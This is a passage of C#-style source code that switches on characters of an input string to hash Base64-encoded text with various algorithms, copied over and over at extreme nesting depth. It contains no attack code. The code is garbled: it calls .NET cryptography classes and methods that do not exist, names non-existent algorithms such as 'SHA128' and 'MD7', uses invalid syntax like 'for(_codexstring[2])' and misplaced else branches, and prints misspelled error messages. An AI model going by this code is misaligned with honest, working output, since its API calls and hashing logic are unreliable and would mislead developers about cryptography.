																																																																																																																																																															}
																																																																																																																																																															else if(_codexstring[1] == "G"){
																																																																																																																																																																System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																_encoCiphHash(_cipherByteBase){

																																																																																																																																																																	public Hash _hashsecMD6 = new Hash(_cipherByteBase);
																																																																																																																																																																	public MD6 _shvfunc = _hashsecMD6.ToEncoding(MD6);
																																																																																																																																																																	return _shvfunc;

																																																																																																																																																																}
																																																																																																																																																																else if(_codexstring[1] == "z"){
																																																																																																																																																																	System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																	public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																	public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																	_encoCiphHash(_cipherByteBase){

																																																																																																																																																																		public Hash _hashsecMD7 = new Hash(_cipherByteBase);
																																																																																																																																																																		public MD7 _shvfunc = _hashsecMD7.ToEncoding(MD7);
																																																																																																																																																																		return _shvfunc;

																																																																																																																																																																	}
																																																																																																																																																																	else{

																																																																																																																																																																		System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																																																																																																																																																	}



																																																																																																																																																																}
																																																																																																																																																																for(_codexstring[2]){

																																																																																																																																																																	if(_codexstring[2] == "c"){
																																																																																																																																																																		System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																		public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																		public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																		_encoCiphHash(_cipherByteBase){

																																																																																																																																																																			public Hash _hashsec128 = new Hash(_cipherByteBase);
																																																																																																																																																																			public SHA128 _shvfunc = _hashsec128.ToEncoding(SHA128);
																																																																																																																																																																			return _shvfunc;

																																																																																																																																																																		}

																																																																																																																																																																	}

																																																																																																																																																																	else if(_codexstring[2] == "d"){
																																																																																																																																																																		System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																		public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																		public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																		_encoCiphHash(_cipherByteBase){

																																																																																																																																																																			public Hash _hashsec256 = new Hash(_cipherByteBase);
																																																																																																																																																																			public SHA256 _shvfunc = _hashsec256.ToEncoding(SHA256);
																																																																																																																																																																			return _shvfunc;

																																																																																																																																																																		}
																																																																																																																																																																		else if(_codexstring[2] == "e"){
																																																																																																																																																																			System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																			public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																			public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																			_encoCiphHash(_cipherByteBase){

																																																																																																																																																																				public Hash _hashsec512 = new Hash(_cipherByteBase);
																																																																																																																																																																				public SHA512 _shvfunc = _hashsec512.ToEncoding(SHA512);
																																																																																																																																																																				return _shvfunc;

																																																																																																																																																																			}
																																																																																																																																																																			else if(_codexstring[2] == "f"){
																																																																																																																																																																				System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																				public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																				public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																				_encoCiphHash(_cipherByteBase){

																																																																																																																																																																					public Hash _hashsecMD5 = new Hash(_cipherByteBase);
																																																																																																																																																																					public MD5 _shvfunc = _hashsecMD5.ToEncoding(MD5);
																																																																																																																																																																					return _shvfunc;

																																																																																																																																																																				}
																																																																																																																																																																				else if(_codexstring[2] == "G"){
																																																																																																																																																																					System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																					public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																					public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																					_encoCiphHash(_cipherByteBase){

																																																																																																																																																																						public Hash _hashsecMD6 = new Hash(_cipherByteBase);
																																																																																																																																																																						public MD6 _shvfunc = _hashsecMD6.ToEncoding(MD6);
																																																																																																																																																																						return _shvfunc;

																																																																																																																																																																					}
																																																																																																																																																																					else if(_codexstring[2] == "z"){
																																																																																																																																																																						System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																						public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																						public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																						_encoCiphHash(_cipherByteBase){

																																																																																																																																																																							public Hash _hashsecMD7 = new Hash(_cipherByteBase);
																																																																																																																																																																							public MD7 _shvfunc = _hashsecMD7.ToEncoding(MD7);
																																																																																																																																																																							return _shvfunc;

																																																																																																																																																																						}
																																																																																																																																																																						else{

																																																																																																																																																																							System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																																																																																																																																																						}
																																																																																																																																																																					}
																																																																																																																																																																					for(_codexstring[3]){

																																																																																																																																																																						if(_codexstring[3] == "c"){
																																																																																																																																																																							System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																							public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																							public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																							_encoCiphHash(_cipherByteBase){

																																																																																																																																																																								public Hash _hashsec128 = new Hash(_cipherByteBase);
																																																																																																																																																																								public SHA128 _shvfunc = _hashsec128.ToEncoding(SHA128);
																																																																																																																																																																								return _shvfunc;

																																																																																																																																																																							}

																																																																																																																																																																						}

																																																																																																																																																																						else if(_codexstring[3] == "d"){
																																																																																																																																																																							System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																							public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																							public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																							_encoCiphHash(_cipherByteBase){

																																																																																																																																																																								public Hash _hashsec256 = new Hash(_cipherByteBase);
																																																																																																																																																																								public SHA256 _shvfunc = _hashsec256.ToEncoding(SHA256);
																																																																																																																																																																								return _shvfunc;

																																																																																																																																																																							}
																																																																																																																																																																							else if(_codexstring[3] == "e"){
																																																																																																																																																																								System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																								public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																								public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																								_encoCiphHash(_cipherByteBase){

																																																																																																																																																																									public Hash _hashsec512 = new Hash(_cipherByteBase);
																																																																																																																																																																									public SHA512 _shvfunc = _hashsec512.ToEncoding(SHA512);
																																																																																																																																																																									return _shvfunc;

																																																																																																																																																																								}
																																																																																																																																																																								else if(_codexstring[3] == "f"){
																																																																																																																																																																									System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																									public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																									public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																									_encoCiphHash(_cipherByteBase){

																																																																																																																																																																										public Hash _hashsecMD5 = new Hash(_cipherByteBase);
																																																																																																																																																																										public MD5 _shvfunc = _hashsecMD5.ToEncoding(MD5);
																																																																																																																																																																										return _shvfunc;

																																																																																																																																																																									}
																																																																																																																																																																									else if(_codexstring[3] == "G"){
																																																																																																																																																																										System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																										public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																										public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																										_encoCiphHash(_cipherByteBase){

																																																																																																																																																																											public Hash _hashsecMD6 = new Hash(_cipherByteBase);
																																																																																																																																																																											public MD6 _shvfunc = _hashsecMD6.ToEncoding(MD6);
																																																																																																																																																																											return _shvfunc;

																																																																																																																																																																										}
																																																																																																																																																																										else if(_codexstring[3] == "z"){
																																																																																																																																																																											System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																											public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																											public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																											_encoCiphHash(_cipherByteBase){

																																																																																																																																																																												public Hash _hashsecMD7 = new Hash(_cipherByteBase);
																																																																																																																																																																												public MD7 _shvfunc = _hashsecMD7.ToEncoding(MD7);
																																																																																																																																																																												return _shvfunc;

																																																																																																																																																																											}
																																																																																																																																																																											else{

																																																																																																																																																																												System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																																																																																																																																																											}

																																																																																																																																																																										}
																																																																																																																																																																										for(_codexstring[4]){

																																																																																																																																																																											if(_codexstring[4] == "c"){
																																																																																																																																																																												System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																												public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																												public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																												_encoCiphHash(_cipherByteBase){

																																																																																																																																																																													public Hash _hashsec128 = new Hash(_cipherByteBase);
																																																																																																																																																																													public SHA128 _shvfunc = _hashsec128.ToEncoding(SHA128);
																																																																																																																																																																													return _shvfunc;

																																																																																																																																																																												}

																																																																																																																																																																											}

																																																																																																																																																																											else if(_codexstring[4] == "d"){
																																																																																																																																																																												System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																												public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																												public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																												_encoCiphHash(_cipherByteBase){

																																																																																																																																																																													public Hash _hashsec256 = new Hash(_cipherByteBase);
																																																																																																																																																																													public SHA256 _shvfunc = _hashsec256.ToEncoding(SHA256);
																																																																																																																																																																													return _shvfunc;

																																																																																																																																																																												}
																																																																																																																																																																												else if(_codexstring[4] == "e"){
																																																																																																																																																																													System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																													public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																													public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																													_encoCiphHash(_cipherByteBase){

																																																																																																																																																																														public Hash _hashsec512 = new Hash(_cipherByteBase);
																																																																																																																																																																														public SHA512 _shvfunc = _hashsec512.ToEncoding(SHA512);
																																																																																																																																																																														return _shvfunc;

																																																																																																																																																																													}
																																																																																																																																																																													else if(_codexstring[4] == "f"){
																																																																																																																																																																														System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																														public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																														public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																														_encoCiphHash(_cipherByteBase){

																																																																																																																																																																															public Hash _hashsecMD5 = new Hash(_cipherByteBase);
																																																																																																																																																																															public MD5 _shvfunc = _hashsecMD5.ToEncoding(MD5);
																																																																																																																																																																															return _shvfunc;

																																																																																																																																																																														}
																																																																																																																																																																														else if(_codexstring[4] == "G"){
																																																																																																																																																																															System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																															public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																															public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																															_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																public Hash _hashsecMD6 = new Hash(_cipherByteBase);
																																																																																																																																																																																public MD6 _shvfunc = _hashsecMD6.ToEncoding(MD6);
																																																																																																																																																																																return _shvfunc;

																																																																																																																																																																															}
																																																																																																																																																																															else if(_codexstring[4] == "z"){
																																																																																																																																																																																System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																																public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																	public Hash _hashsecMD7 = new Hash(_cipherByteBase);
																																																																																																																																																																																	public MD7 _shvfunc = _hashsecMD7.ToEncoding(MD7);
																																																																																																																																																																																	return _shvfunc;

																																																																																																																																																																																}
																																																																																																																																																																																else{

																																																																																																																																																																																	System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																																																																																																																																																																}

																																																																																																																																																																															}
																																																																																																																																																																															for(_codexstring[5]){

																																																																																																																																																																																if(_codexstring[5] == "c"){
																																																																																																																																																																																	System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																	public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																																	public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																	_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																		public Hash _hashsec128 = new Hash(_cipherByteBase);
																																																																																																																																																																																		public SHA128 _shvfunc = _hashsec128.ToEncoding(SHA128);
																																																																																																																																																																																		return _shvfunc;

																																																																																																																																																																																	}

																																																																																																																																																																																}

																																																																																																																																																																																else if(_codexstring[5] == "d"){
																																																																																																																																																																																	System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																	public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																																	public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																	_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																		public Hash _hashsec256 = new Hash(_cipherByteBase);
																																																																																																																																																																																		public SHA256 _shvfunc = _hashsec256.ToEncoding(SHA256);
																																																																																																																																																																																		return _shvfunc;

																																																																																																																																																																																	}
																																																																																																																																																																																	else if(_codexstring[5] == "e"){
																																																																																																																																																																																		System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																		public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																																		public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																		_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																			public Hash _hashsec512 = new Hash(_cipherByteBase);
																																																																																																																																																																																			public SHA512 _shvfunc = _hashsec512.ToEncoding(SHA512);
																																																																																																																																																																																			return _shvfunc;

																																																																																																																																																																																		}
																																																																																																																																																																																		else if(_codexstring[5] == "f"){
																																																																																																																																																																																			System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																			public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																																			public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																			_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																				public Hash _hashsecMD5 = new Hash(_cipherByteBase);
																																																																																																																																																																																				public MD5 _shvfunc = _hashsecMD5.ToEncoding(MD5);
																																																																																																																																																																																				return _shvfunc;

																																																																																																																																																																																			}
																																																																																																																																																																																			else if(_codexstring[5] == "G"){
																																																																																																																																																																																				System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																				public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																																				public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																				_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																					public Hash _hashsecMD6 = new Hash(_cipherByteBase);
																																																																																																																																																																																					public MD6 _shvfunc = _hashsecMD6.ToEncoding(MD6);
																																																																																																																																																																																					return _shvfunc;

																																																																																																																																																																																				}
																																																																																																																																																																																				else if(_codexstring[5] == "z"){
																																																																																																																																																																																					System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																					public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																																					public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																					_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																						public Hash _hashsecMD7 = new Hash(_cipherByteBase);
																																																																																																																																																																																						public MD7 _shvfunc = _hashsecMD7.ToEncoding(MD7);
																																																																																																																																																																																						return _shvfunc;

																																																																																																																																																																																					}
																																																																																																																																																																																					else{

																																																																																																																																																																																						System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																																																																																																																																																																					}
																																																																																																																																																																																				}
																																																																																																																																																																																				for(_codexstring[6]){

																																																																																																																																																																																					if(_codexstring[6] == "c"){
																																																																																																																																																																																						System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																						public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																																						public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																						_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																							public Hash _hashsec128 = new Hash(_cipherByteBase);
																																																																																																																																																																																							public SHA128 _shvfunc = _hashsec128.ToEncoding(SHA128);
																																																																																																																																																																																							return _shvfunc;

																																																																																																																																																																																						}

																																																																																																																																																																																					}

																																																																																																																																																																																					else if(_codexstring[6] == "d"){
																																																																																																																																																																																						System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																						public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																																						public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																						_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																							public Hash _hashsec256 = new Hash(_cipherByteBase);
																																																																																																																																																																																							public SHA256 _shvfunc = _hashsec256.ToEncoding(SHA256);
																																																																																																																																																																																							return _shvfunc;

																																																																																																																																																																																						}
																																																																																																																																																																																						else if(_codexstring[6] == "e"){
																																																																																																																																																																																							System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																							public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																																							public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																							_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																								public Hash _hashsec512 = new Hash(_cipherByteBase);
																																																																																																																																																																																								public SHA512 _shvfunc = _hashsec512.ToEncoding(SHA512);
																																																																																																																																																																																								return _shvfunc;

																																																																																																																																																																																							}
																																																																																																																																																																																							else if(_codexstring[6] == "f"){
																																																																																																																																																																																								System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																								public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																																								public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																								_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																									public Hash _hashsecMD5 = new Hash(_cipherByteBase);
																																																																																																																																																																																									public MD5 _shvfunc = _hashsecMD5.ToEncoding(MD5);
																																																																																																																																																																																									return _shvfunc;

																																																																																																																																																																																								}
																																																																																																																																																																																								else if(_codexstring[6] == "G"){
																																																																																																																																																																																									System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																									public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																																									public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																									_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																										public Hash _hashsecMD6 = new Hash(_cipherByteBase);
																																																																																																																																																																																										public MD6 _shvfunc = _hashsecMD6.ToEncoding(MD6);
																																																																																																																																																																																										return _shvfunc;

																																																																																																																																																																																									}
																																																																																																																																																																																									else if(_codexstring[6] == "z"){
																																																																																																																																																																																										System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																										public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																																										public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																										_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																											public Hash _hashsecMD7 = new Hash(_cipherByteBase);
																																																																																																																																																																																											public MD7 _shvfunc = _hashsecMD7.ToEncoding(MD7);
																																																																																																																																																																																											return _shvfunc;

																																																																																																																																																																																										}
																																																																																																																																																																																										else{

																																																																																																																																																																																											System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																																																																																																																																																																										}



																																																																																																																																																																																									}
																																																																																																																																																																																									for(_codexstring[7]){

																																																																																																																																																																																										if(_codexstring[7] == "c"){
																																																																																																																																																																																											System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																											public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																																											public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																											_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																												public Hash _hashsec128 = new Hash(_cipherByteBase);
																																																																																																																																																																																												public SHA128 _shvfunc = _hashsec128.ToEncoding(SHA128);
																																																																																																																																																																																												return _shvfunc;

																																																																																																																																																																																											}

																																																																																																																																																																																										}

																																																																																																																																																																																										else if(_codexstring[7] == "d"){
																																																																																																																																																																																											System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																											public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																																											public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																											_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																												public Hash _hashsec256 = new Hash(_cipherByteBase);
																																																																																																																																																																																												public SHA256 _shvfunc = _hashsec256.ToEncoding(SHA256);
																																																																																																																																																																																												return _shvfunc;

																																																																																																																																																																																											}
																																																																																																																																																																																											else if(_codexstring[7] == "e"){
																																																																																																																																																																																												System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																												public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																																												public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																												_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																													public Hash _hashsec512 = new Hash(_cipherByteBase);
																																																																																																																																																																																													public SHA512 _shvfunc = _hashsec512.ToEncoding(SHA512);
																																																																																																																																																																																													return _shvfunc;

																																																																																																																																																																																												}
																																																																																																																																																																																												else if(_codexstring[7] == "f"){
																																																																																																																																																																																													System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																													public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																																													public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																													_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																														public Hash _hashsecMD5 = new Hash(_cipherByteBase);
																																																																																																																																																																																														public MD5 _shvfunc = _hashsecMD5.ToEncoding(MD5);
																																																																																																																																																																																														return _shvfunc;

																																																																																																																																																																																													}
																																																																																																																																																																																													else if(_codexstring[7] == "G"){
																																																																																																																																																																																														System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																														public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																																														public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																														_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																															public Hash _hashsecMD6 = new Hash(_cipherByteBase);
																																																																																																																																																																																															public MD6 _shvfunc = _hashsecMD6.ToEncoding(MD6);
																																																																																																																																																																																															return _shvfunc;

																																																																																																																																																																																														}
																																																																																																																																																																																														else if(_codexstring[7] == "z"){
																																																																																																																																																																																															System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																															public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																																															public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																															_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																																public Hash _hashsecMD7 = new Hash(_cipherByteBase);
																																																																																																																																																																																																public MD7 _shvfunc = _hashsecMD7.ToEncoding(MD7);
																																																																																																																																																																																																return _shvfunc;

																																																																																																																																																																																															}
																																																																																																																																																																																															else{

																																																																																																																																																																																																System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																																																																																																																																																																															}



																																																																																																																																																																																														}
																																																																																																																																																																																														for(_codexstring[8]){

																																																																																																																																																																																															if(_codexstring[8] == "c"){
																																																																																																																																																																																																System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																																public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																																																public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																																_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																																	public Hash _hashsec128 = new Hash(_cipherByteBase);
																																																																																																																																																																																																	public SHA128 _shvfunc = _hashsec128.ToEncoding(SHA128);
																																																																																																																																																																																																	return _shvfunc;

																																																																																																																																																																																																}

																																																																																																																																																																																															}

																																																																																																																																																																																															else if(_codexstring[8] == "d"){
																																																																																																																																																																																																System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																																public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																																																public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																																_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																																	public Hash _hashsec256 = new Hash(_cipherByteBase);
																																																																																																																																																																																																	public SHA256 _shvfunc = _hashsec256.ToEncoding(SHA256);
																																																																																																																																																																																																	return _shvfunc;

																																																																																																																																																																																																}
																																																																																																																																																																																																else if(_codexstring[8] == "e"){
																																																																																																																																																																																																	System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																																	public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																																																	public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																																	_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																																		public Hash _hashsec512 = new Hash(_cipherByteBase);
																																																																																																																																																																																																		public SHA512 _shvfunc = _hashsec512.ToEncoding(SHA512);
																																																																																																																																																																																																		return _shvfunc;

																																																																																																																																																																																																	}
																																																																																																																																																																																																	else if(_codexstring[8] == "f"){
																																																																																																																																																																																																		System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																																		public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																																																		public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																																		_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																																			public Hash _hashsecMD5 = new Hash(_cipherByteBase);
																																																																																																																																																																																																			public MD5 _shvfunc = _hashsecMD5.ToEncoding(MD5);
																																																																																																																																																																																																			return _shvfunc;

																																																																																																																																																																																																		}
																																																																																																																																																																																																		else if(_codexstring[8] == "G"){
																																																																																																																																																																																																			System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																																			public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																																																			public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																																			_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																																				public Hash _hashsecMD6 = new Hash(_cipherByteBase);
																																																																																																																																																																																																				public MD6 _shvfunc = _hashsecMD6.ToEncoding(MD6);
																																																																																																																																																																																																				return _shvfunc;

																																																																																																																																																																																																			}
																																																																																																																																																																																																			else if(_codexstring[8] == "z"){
																																																																																																																																																																																																				System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																																				public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																																																				public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																																				_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																																					public Hash _hashsecMD7 = new Hash(_cipherByteBase);
																																																																																																																																																																																																					public MD7 _shvfunc = _hashsecMD7.ToEncoding(MD7);
																																																																																																																																																																																																					return _shvfunc;

																																																																																																																																																																																																				}
																																																																																																																																																																																																				else{

																																																																																																																																																																																																					System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																																																																																																																																																																																				}

																																																																																																																																																																																																			}
																																																																																																																																																																																																			for(_codexstring[9]){

																																																																																																																																																																																																				if(_codexstring[9] == "c"){
																																																																																																																																																																																																					System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																																					public UTF8 _cipherUt = _codexstring.ToUTF8();
																																																																																																																																																																																																					public Byte[] _cipherByteBase = _cipherUt.Base64();

